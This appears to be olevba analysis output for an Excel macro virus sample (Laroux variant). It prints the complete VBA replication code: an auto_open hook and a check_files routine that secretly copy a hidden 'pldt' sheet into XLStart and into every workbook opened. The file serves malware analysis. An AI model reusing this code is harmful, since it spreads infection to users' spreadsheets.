olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.e3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux.e3 - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global X, Y, ContSet, Markup As Integer

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
     Application.OnSheetActivate = "check_files"
     On Error GoTo TheEnd
     CommandBars.Add(Name:="Pricing", Position:=msoBarFloating, temporary:=True).Visible = True
     Set cbutton1 = CommandBars("Pricing").Controls.Add(Type:=msoControlButton, before:=1, temporary:=True)
     Set cbutton2 = CommandBars("Pricing").Controls.Add(Type:=msoControlButton, before:=2, temporary:=True)
     cbutton1.Visible = True
     cbutton1.Style = msoButtonIconAndCaption
     cbutton1.Caption = "&Insert"
     cbutton1.OnAction = "InsertRow"
     cbutton1.FaceId = 296
     cbutton2.Visible = True
     cbutton2.Style = msoButtonIconAndCaption
     cbutton2.Caption = "&Delete"
     cbutton2.OnAction = "DeleteRow"
     cbutton2.FaceId = 293
TheEnd:
End Sub

Public Sub EnableCustom()
    frmCont.txtRack.Enabled = True
    frmCont.lblRack.Enabled = True
    frmCont.txtASRS.Enabled = True
    frmCont.lblASRS.Enabled = True
    frmCont.txtLoad.Enabled = True
    frmCont.lblLoad.Enabled = True
    frmCont.txtSecondary.Enabled = True
    frmCont.lblSecondary.Enabled = True
    frmCont.txtControls.Enabled = True
    frmCont.lblControls.Enabled = True
    frmCont.txtInventory.Enabled = True
    frmCont.lblInventory.Enabled = True
    frmCont.txtPower.Enabled = True
    frmCont.lblPower.Enabled = True
    frmCont.txtMisc.Enabled = True
    frmCont.lblMisc.Enabled = True
    frmCont.txtFire.Enabled = True
    frmCont.lblFire.Enabled = True
    frmCont.txtTransportation.Enabled = True
    frmCont.lblTransportation.Enabled = True
    frmCont.lblTotal.Enabled = True
    frmCont.lblPercent.Enabled = True
End Sub

Public Sub DisableCustom()
    frmCont.txtRack.Enabled = False
    frmCont.lblRack.Enabled = False
    frmCont.txtASRS.Enabled = False
    frmCont.lblASRS.Enabled = False
    frmCont.txtLoad.Enabled = False
    frmCont.lblLoad.Enabled = False
    frmCont.txtSecondary.Enabled = False
    frmCont.lblSecondary.Enabled = False
    frmCont.txtControls.Enabled = False
    frmCont.lblControls.Enabled = False
    frmCont.txtInventory.Enabled = False
    frmCont.lblInventory.Enabled = False
    frmCont.txtPower.Enabled = False
    frmCont.lblPower.Enabled = False
    frmCont.txtMisc.Enabled = False
    frmCont.lblMisc.Enabled = False
    frmCont.txtFire.Enabled = False
    frmCont.lblFire.Enabled = False
    frmCont.txtTransportation.Enabled = False
    frmCont.lblTransportation.Enabled = False
    frmCont.lblPercent.Enabled = False
    frmCont.lblTotal.Enabled = False
End Sub

Public Sub GetPercentCustom()
    Dim I As Double
    'Gets Rack %
    frmCont.txtRack.Text = Range("RackCont")
    I = frmCont.txtRack.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtRack.Text = I
    'Gets AS/RS %
    frmCont.txtASRS.Text = Range("ASRSCont")
    I = frmCont.txtASRS.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtASRS.Text = I
    'Gets Load Handling Equipment %
    frmCont.txtLoad.Text = Range("LoadCont")
    I = frmCont.txtLoad.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtLoad.Text = I
    'Gets Secondary Load Handling Equipment %
    frmCont.txtSecondary.Text = Range("SecondCont")
    I = frmCont.txtSecondary.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtSecondary.Text = I
    'Gets Controls %
    frmCont.txtControls.Text = Range("ControlCont")
    I = frmCont.txtControls.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtControls.Text = I
    'Gets Inventory %
    frmCont.txtInventory.Text = Range("SoftCont") + Range("HardCont")
    I = frmCont.txtInventory.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtInventory.Text = I
    'Gets Power Distibution & Communication System %
    frmCont.txtPower.Text = Range("PowerCont")
    I = frmCont.txtPower.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtPower.Text = I
    'Gets Misc Project Expense%
    frmCont.txtMisc.Text = Range("FireCont")
    I = frmCont.txtMisc.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtMisc.Text = I
    'Gets Fire Protection %
    frmCont.txtFire.Text = Range("MiscCont")
    I = frmCont.txtFire.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtFire.Text = I
    'Gets Transportation %
    frmCont.txtTransportation.Text = Range("TransCont")
    I = frmCont.txtTransportation.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtTransportation.Text = I
End Sub

Public Sub GetPercentDefault()
    Dim I As Double
    On Error GoTo ErrorHandler
    'Gets Rack %
    frmCont.txtRack.Text = Range("Cont1")
    I = frmCont.txtRack.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtRack.Text = I
    'Gets AS/RS %
    frmCont.txtASRS.Text = Range("Cont2")
    I = frmCont.txtASRS.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtASRS.Text = I
    'Gets Load Handling Equipment %
    frmCont.txtLoad.Text = Range("Cont3")
    I = frmCont.txtLoad.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtLoad.Text = I
    'Gets Secondary Load Handling Equipment %
    frmCont.txtSecondary.Text = Range("Cont4")
    I = frmCont.txtSecondary.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtSecondary.Text = I
    'Gets Controls %
    frmCont.txtControls.Text = Range("Cont5")
    I = frmCont.txtControls.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtControls.Text = I
    'Gets Inventory %
    frmCont.txtInventory.Text = Range("Cont6") + Range("Cont7")
    I = frmCont.txtInventory.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtInventory.Text = I
    'Gets Power Distibution & Communication System %
    frmCont.txtPower.Text = Range("Cont8")
    I = frmCont.txtPower.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtPower.Text = I
    'Gets Misc Project Expense%
    frmCont.txtMisc.Text = Range("Cont10")
    I = frmCont.txtMisc.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtMisc.Text = I
    'Gets Fire Protection %
    frmCont.txtFire.Text = Range("Cont9")
    I = frmCont.txtFire.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtFire.Text = I
    'Gets Transportation %
    frmCont.txtTransportation.Text = Range("Cont11")
    I = frmCont.txtTransportation.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtTransportation.Text = I
ErrorHandler:
    frmCont.txtRack.Text = 0
    frmCont.txtASRS.Text = 0
    frmCont.txtLoad.Text = 0
    frmCont.txtSecondary.Text = 0
    frmCont.txtControls.Text = 0
    frmCont.txtInventory.Text = 0
    frmCont.txtPower.Text = 0
    frmCont.txtMisc.Text = 0
    frmCont.txtFire.Text = 0
    frmCont.txtTransportation.Text = 0
    Exit Sub
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    'Find xlStart directory
    C$ = Application.StartupPath
    'Check to see if pldt.xls exists
    m$ = Dir(C$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    'Check if the active workbook has any modules in it
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    'whichfile variable set to 10, 20 or 0 based on above
    whichfile = p + w * 10
Select Case whichfile
    'pldt.xls file exists or active workbook has modules...
    Case 10
    'can't see what the program is doing
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    sheets("pldt").Visible = True
    sheets("pldt").Select
    sheets("pldt").Copy
    'Clears this information for the activeworkbook
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    'Changes the current directory to xlStart
    ChDir Application.StartupPath
    'Can't see the current window...
    ActiveWindow.Visible = False
    'Save the activeworkbook as pldt.xls in the xlStart directory
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    'Puts the current directory back to where it was
    ChDir c4$
    'hide the pldt sheet
    Workbooks(n4$).sheets("pldt").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").sheets("pldt").Copy before:=Workbooks(n4$).sheets(1)
        Workbooks(n4$).sheets("pldt").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

